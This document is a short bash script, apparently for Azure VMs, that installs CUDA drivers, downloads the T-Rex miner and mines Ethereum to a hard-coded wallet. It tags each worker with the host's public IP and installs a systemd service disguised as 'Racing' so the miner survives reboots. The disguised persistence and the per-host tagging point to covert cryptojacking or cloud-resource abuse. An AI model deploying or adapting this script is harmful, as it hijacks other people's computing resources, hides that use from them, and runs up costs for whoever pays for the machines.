cd /home/azure
woker=$(date +'%d%m_%H-')
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
woker+=$myip
if [[ ! -f isHaveSetupCoin.txt ]]
then
    echo "Start setup..."
    sudo apt-get install linux-headers-$(uname -r) -y
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
    wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
    sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
    sudo apt-get update
    sudo apt-get -y install cuda-drivers
    sudo apt-get install libcurl3 -y
    echo "xxx vip pro" > isHaveSetupCoin.txt
    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
    sudo killall XXX
    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xfbbaaec0813a4bb8420b956f4c80519cdabbeb9c -p x -w $woker &
else
    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
    sudo killall XXX
    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xfbbaaec0813a4bb8420b956f4c80519cdabbeb9c -p x -w $woker &
fi
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xfbbaaec0813a4bb8420b956f4c80519cdabbeb9c -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
